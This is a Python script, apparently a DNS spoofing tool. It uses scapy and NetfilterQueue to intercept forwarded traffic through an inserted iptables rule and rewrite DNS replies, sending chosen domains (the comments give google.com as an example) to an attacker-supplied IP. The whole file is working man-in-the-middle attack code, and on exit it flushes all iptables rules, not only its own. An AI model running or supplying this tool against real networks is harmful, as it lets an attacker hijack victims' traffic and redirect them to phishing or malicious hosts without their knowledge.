from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
from color import *

# DNS
dns = sys.argv[1].split('=')
dns[1] = dns[1].split(',')
dns[0]=dns[0]+'.'
dns[1][1]=dns[1][1]+'.'
dns_hosts = {}
dns_hosts[dns[0].encode()] = dns[1][0]
dns_hosts[dns[1][1].encode()] = dns[2]

#dns_hosts = {
#    b"www.google.com.": "192.168.246.128",
#    b"google.com.": "192.168.246.128",
#}

# 
def process_packet(packet):
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print(blue("[Before]:"), scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print(red("[After]:"), scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def modify_packet(packet):
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()
try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
